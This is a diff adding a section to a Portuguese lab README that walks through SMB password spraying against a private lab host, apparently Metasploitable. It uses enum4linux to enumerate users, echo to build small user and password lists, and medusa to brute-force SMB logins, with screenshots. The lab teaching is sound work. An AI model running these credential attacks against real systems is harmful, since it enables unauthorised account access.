@@ -90,8 +90,41 @@ depois de executar o comando ele mostra várias combinações de usuários e sen
 <img width="1309" height="729" alt="Captura de tela 2026-05-05 201413" src="https://github.com/user-attachments/assets/c5f9b8c6-2d74-4259-b94a-175831b3ecc9" />
 
 Após testar algumas das credenciais o acesso será feito
-
+.
 <img width="1483" height="808" alt="Captura de tela 2026-05-05 202644" src="https://github.com/user-attachments/assets/8e7d6499-1d8e-4d3c-831f-45355ceac7de" />
 
 Password Spraying em SMB com Enumeração de Usuários:
+
+Antes de começar os testes primeiro precisamos fazer a enumeração de usuários do SMB para isso usaremos a aplicação enum4linux. No terminal digite:
+
+enum4linux -a 192.168.56.101 | tee enum4_output.txt
+
+"-a" ativará todas as técnicas possíveis de enumeração
+"tee" serve para gravar a saída do comando em um arquivo e depois exibir esse arquivo
+
+<img width="516" height="134" alt="Captura de tela 2026-05-05 214354" src="https://github.com/user-attachments/assets/2324b3b1-e470-43ac-a3da-18bda91f0e86" />
+
+<img width="914" height="837" alt="Captura de tela 2026-05-05 215133" src="https://github.com/user-attachments/assets/9e4dfb8f-f675-460f-b105-921188f630aa" />
+
+caso queira ver o arquivo txt digite o comando:
+
+less enum4_output.txt
+
+<img width="1560" height="827" alt="Captura de tela 2026-05-05 215358" src="https://github.com/user-attachments/assets/5bd00f2f-dc42-4dc3-93ef-e977d0e42a9c" />
+
+Em seguida será preciso criar um lista de usuários e senhas, digite o comando:
+
+echo -e "user\nmsfadmin\nservice" > smb_users.txt (para criação de usuários)
+
+echo -e "password\n123456\nWelcome\nmsfadmin" > senhas_spray.txt (para criação de senhas)
+
+Agora será possivel iniciar o processo de invasão do SMB usando o medusa, para isso digite o comando:
+
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+<img width="1361" height="332" alt="Captura de tela 2026-05-05 220705" src="https://github.com/user-attachments/assets/65f8bf99-9c40-4a92-85a9-e7e1f8f09cb9" />
+
+
+
+
 
